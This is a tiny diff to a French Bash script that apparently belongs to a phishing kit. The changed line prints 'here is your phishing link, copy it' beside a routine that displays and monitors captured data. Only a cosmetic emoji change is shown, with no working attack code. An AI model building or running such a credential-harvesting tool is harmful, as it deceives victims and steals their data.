@@ -42,7 +42,7 @@ surveiller_donnees() {
         echo -e "${JAUNE}Données actuelles :${NC}"
         afficher_donnees
     else
-        echo -e "${JAUNE}voici votre lien phishing copie-le 👇${NC}"
+        echo -e "${JAUNE}voici votre lien phishing copie-le 👇⚠️👇${NC}"
     fi
 
     # Surveiller les modifications du fichier
